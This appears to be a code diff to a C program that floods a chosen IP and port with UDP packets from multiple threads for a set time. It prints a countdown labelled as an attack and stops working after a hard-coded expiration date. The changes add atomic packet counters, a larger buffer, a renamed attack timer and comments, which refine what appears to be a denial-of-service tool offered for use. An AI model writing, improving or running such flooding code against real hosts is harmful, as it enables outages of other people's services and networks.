@@ -14,22 +14,29 @@
 #include <fcntl.h>
 #include <sys/types.h>
 #include <signal.h>
+#include <stdatomic.h>
 
-#define BUFFER_SIZE 9000
+#define BUFFER_SIZE 15000
 #define EXPIRATION_YEAR 2025
 #define EXPIRATION_MONTH 9
 #define EXPIRATION_DAY 27
 
+// Global variables
 char *ip;
 int port;
 int duration;
 char padding_data[2 * 1024 * 1024];
+atomic_long packets_sent = 0;    // Atomic to prevent race conditions
+atomic_long packets_failed = 0;  // Atomic to prevent race conditions
 volatile sig_atomic_t stop_flag = 0;
+unsigned long start_time;
 
+// Function to calculate CRC32 for verification
 unsigned long calculate_crc32(const char *data) {
     return crc32(0, (const unsigned char *)data, strlen(data));
 }
 
+// Function to check expiration of the script
 void check_expiration() {
     time_t now;
     struct tm expiration_date = {0};   
@@ -43,10 +50,7 @@ void check_expiration() {
     }
 }
 
-long packets_sent = 0;
-long packets_failed = 0;
-char *payloads[] = {"UDP traffic test"};  // Example payload, adjust based on your actual use case
-
+// Function to send UDP traffic
 void *send_udp_traffic(void *arg) {
     int sock;
     struct sockaddr_in server_addr;
@@ -54,6 +58,7 @@ void *send_udp_traffic(void *arg) {
     int sent_bytes;
     cpu_set_t cpuset;
     
+    // Set thread affinity to a specific CPU core for better performance
     CPU_ZERO(&cpuset);
     CPU_SET(sched_getcpu(), &cpuset);
     if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
@@ -61,11 +66,13 @@ void *send_udp_traffic(void *arg) {
         pthread_exit(NULL);
     }
 
+    // Create a UDP socket
     if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
         perror("Socket creation failed");
         pthread_exit(NULL);
     }
 
+    // Set socket to non-blocking mode
     int flags = fcntl(sock, F_GETFL, 0);
     if (flags < 0) {
         perror("fcntl F_GETFL failed");
@@ -87,9 +94,10 @@ void *send_udp_traffic(void *arg) {
         pthread_exit(NULL);
     }
 
-    snprintf(buffer, sizeof(buffer), "%s", payloads[0]);
-    time_t start_time = time(NULL);
-    time_t end_time = start_time + duration;
+    snprintf(buffer, sizeof(buffer), "UDP traffic test");
+
+    time_t attack_start_time = time(NULL);
+    time_t end_time = attack_start_time + duration;
 
     // Track and update remaining time
     while (time(NULL) < end_time && !stop_flag) {
@@ -97,16 +105,16 @@ void *send_udp_traffic(void *arg) {
                             (struct sockaddr *)&server_addr, sizeof(server_addr));
         if (sent_bytes < 0) {
             if (errno != EAGAIN && errno != EWOULDBLOCK) {
-                packets_failed++;
+                atomic_fetch_add(&packets_failed, 1); // Increment failed packets atomically
                 perror("Send failed");
                 break;
             }
         } else {
-            packets_sent++;
+            atomic_fetch_add(&packets_sent, 1); // Increment sent packets atomically
         }
 
         // Print remaining time
-        printf("⏳ REMAINING TIME FOR ATTACK: %d SECONDS\r", duration - (int)(time(NULL) - start_time));
+        printf("⏳ REMAINING TIME FOR ATTACK: %d SECONDS\r", duration - (int)(time(NULL) - attack_start_time));
         fflush(stdout);
         sleep(1);  // Update every second
     }
@@ -114,9 +122,11 @@ void *send_udp_traffic(void *arg) {
     if (close(sock) < 0) {
         perror("Failed to close socket");
     }
+
     pthread_exit(NULL);
 }
 
+// Expiration check thread to monitor expiration
 void *expiration_check_thread(void *arg) {
     while (!stop_flag) {
         check_expiration();
@@ -125,10 +135,12 @@ void *expiration_check_thread(void *arg) {
     pthread_exit(NULL);
 }
 
+// Signal handler to gracefully stop the attack
 void signal_handler(int signum) {
     stop_flag = 1;
 }
 
+// Main entry point
 int main(int argc, char *argv[]) {
     if (signal(SIGINT, signal_handler) == SIG_ERR) {
         perror("signal setup failed");
